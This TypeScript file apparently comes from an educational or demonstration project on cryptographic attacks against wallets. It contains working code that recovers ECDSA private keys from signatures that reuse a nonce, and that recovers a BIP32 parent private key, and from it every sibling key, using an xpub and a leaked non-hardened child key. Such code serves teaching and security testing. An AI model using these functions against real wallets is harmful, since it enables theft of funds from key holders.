import { secp256k1 } from "@noble/curves/secp256k1.js";
import { mod, invert } from "@noble/curves/abstract/modular.js";
import { bytesToNumberBE, numberToBytesBE } from "@noble/curves/utils.js";
import { hmac } from "@noble/hashes/hmac.js";
import { sha512 } from "@noble/hashes/sha2.js";
import { HDKey } from "@scure/bip32";
import { HARDENED_OFFSET } from "./bip32";
import { concatBytes } from "@noble/hashes/utils.js";
import type { XPub } from "./types";

const n = secp256k1.Point.Fn.ORDER;
const G = secp256k1.Point.BASE;

export interface AttackSignature {
  r: bigint;
  s: bigint;
}

export function isHardenedIndex(index: number): boolean {
  return index >= HARDENED_OFFSET;
}

/** FOR EDUCATIONAL/ATTACK DEMO USE ONLY — never use a custom nonce in production. */
export function signWithNonce(
  privKey: Uint8Array,
  msgHash: Uint8Array,
  nonce: Uint8Array,
): AttackSignature {
  const k = bytesToNumberBE(nonce);
  if (k <= 0n || k >= n) {
    throw new Error("Invalid nonce: must be in range (0, n)");
  }

  const R = G.multiply(k);
  const r = mod(R.toAffine().x, n);
  if (r === 0n) {
    throw new Error("Invalid nonce: r === 0");
  }

  const z = bytesToNumberBE(msgHash);
  const d = bytesToNumberBE(privKey);
  const kInv = invert(k, n);
  const s = mod(kInv * mod(z + mod(r * d, n), n), n);
  if (s === 0n) {
    throw new Error("Invalid nonce: s === 0");
  }

  return { r, s };
}

/** Both signatures must share the same r value (same nonce k was reused). */
export function recoverNonceFromTwoSigs(s1: bigint, z1: bigint, s2: bigint, z2: bigint): bigint {
  const sDiff = mod(s1 - s2, n);
  if (sDiff === 0n) {
    throw new Error("Signatures have identical s values — cannot recover nonce");
  }
  return mod(mod(z1 - z2, n) * invert(sDiff, n), n);
}

export function recoverPrivKeyFromNonce(r: bigint, s: bigint, z: bigint, k: bigint): Uint8Array {
  const d = mod(mod(s * k - z, n) * invert(r, n), n);
  return numberToBytesBE(d, 32);
}

/**
 * Exploit BIP32 normal derivation: given an xpub and a child's private key,
 * recover the parent's private key.
 *
 * Normal (non-hardened) derivation: childPriv = parse256(IL) + parentPriv mod n
 * where IL = HMAC-SHA512(chainCode, pubKey || ser32(index))[:32]
 *
 * Therefore: parentPriv = childPriv - parse256(IL) mod n
 */
export function xpubChildPrivToParentPriv(
  xpub: XPub,
  childPrivKey: Uint8Array,
  childIndex: number,
): Uint8Array {
  if (isHardenedIndex(childIndex)) {
    throw new Error("Cannot recover parent key from hardened child derivation");
  }

  // Serialize index as 4-byte big-endian
  const indexBytes = new Uint8Array(4);
  new DataView(indexBytes.buffer).setUint32(0, childIndex, false);

  // Compute I = HMAC-SHA512(chainCode, pubKey || index)
  const data = concatBytes(xpub.publicKey, indexBytes);
  const I = hmac(sha512, xpub.chainCode, data);
  const IL = I.slice(0, 32);

  const ilNum = bytesToNumberBE(IL);
  const childNum = bytesToNumberBE(childPrivKey);
  const parentNum = mod(childNum - ilNum, n);

  return numberToBytesBE(parentNum, 32);
}

export function deriveAllSiblings(
  parentPrivKey: Uint8Array,
  chainCode: Uint8Array,
  count: number,
): Uint8Array[] {
  if (count > 1000) {
    throw new Error(`count too large: ${count} (max 1000)`);
  }
  const parent = new HDKey({
    privateKey: parentPrivKey,
    chainCode,
  });

  return Array.from({ length: count }, (_, i) => {
    const child = parent.deriveChild(i);
    if (!child.privateKey) {
      throw new Error(`Failed to derive private key for child index ${i}`);
    }
    return child.privateKey;
  });
}
